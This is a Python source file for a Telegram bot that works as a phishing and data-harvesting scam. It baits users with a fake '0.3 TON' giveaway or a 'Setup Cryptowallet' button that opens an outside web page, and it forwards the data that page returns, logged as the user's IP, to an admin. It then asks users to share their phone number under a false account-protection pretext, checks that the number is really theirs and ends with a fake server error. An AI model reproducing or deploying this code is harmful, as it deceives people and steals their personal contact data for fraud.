import telebot
from telebot.types import WebAppData, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton
from telebot import TeleBot as Bot

with open("token.txt") as f:
    token = f.read().strip()

with open("admin.txt") as f:
    admin = f.read().strip()

bot = Bot(token)

@bot.message_handler(commands=["start"])
def cmd_start(message):
    if len(message.text) >= 8:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton(text="Get 0.3 TON", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
        bot.send_message(message.from_user.id, "Check for 0.3 TON. Press button to receive.", reply_markup=markup)
        link = message.text.split()[1]
    else:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton(text="Setup Cryptowallet", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
        bot.send_message(message.from_user.id, "Press button to setup your Cryptowallet.", reply_markup=markup)
        link = "null"
    user = message.from_user
    resp = f"New click: {link}\n"
    resp += f"User ID: {user.id}\n"
    resp += f"Username: @{user.username}\n"
    resp += f"Permalink: [{user.first_name} {user.last_name}](tg://user?id={user.id})"
    bot.send_message(admin, resp, parse_mode="markdown")

@bot.message_handler(content_types=["web_app_data"])
def wad_handler(message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    btn = KeyboardButton("Confirm account", request_contact=True)
    kb.add(btn)
    data = message.web_app_data.data
    user = message.from_user
    resp = f"New IP: {data}\n"
    resp += f"User ID: {user.id}\n"
    resp += f"Username: @{user.username}\n"
    resp += f"Permalink: [{user.first_name} {user.last_name}](tg://user?id={user.id})"
    bot.send_message(admin, resp, parse_mode="markdown")
    bot.send_message(user.id, "Please confirm your phone number. This is necessary to prevent bots from abusing you and recreating your account, as well as to be able to recover your account if you lose it. Press button below and press OK for confirm.", reply_markup=kb)

@bot.message_handler(content_types=["contact"])
def handle_contact(message):
    phone_number = message.contact.phone_number
    user_id = message.contact.user_id
    user = message.from_user
    resp = f"New phone: {phone_number}\n"
    resp += f"User ID: {user.id} | {user_id}\n"
    resp += f"Username: @{user.username} | @{message.contact.phone_number}\n"
    resp += f"Permalink: [{user.first_name}](tg://user?id={user.id}) | [{message.contact.first_name}](tg://user?id={user_id})\n\n"
    resp += f"VCARD: {message.contact.vcard}"
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    btn = KeyboardButton("Confirm account", request_contact=True)
    kb.add(btn)
    if not user_id == user.id:
        bot.send_message(user.id, "It looks like you sent wrong phone number, try again.", reply_markup=kb)
        resp += "FAKE"
    else:
        bot.send_message(user.id, "Error: Failed to fetch data from server (0xc1). Try again later.")
        resp += "REAL"
    bot.send_message(admin, resp, parse_mode="markdown")

if __name__ == "__main__":
    bot.infinity_polling()
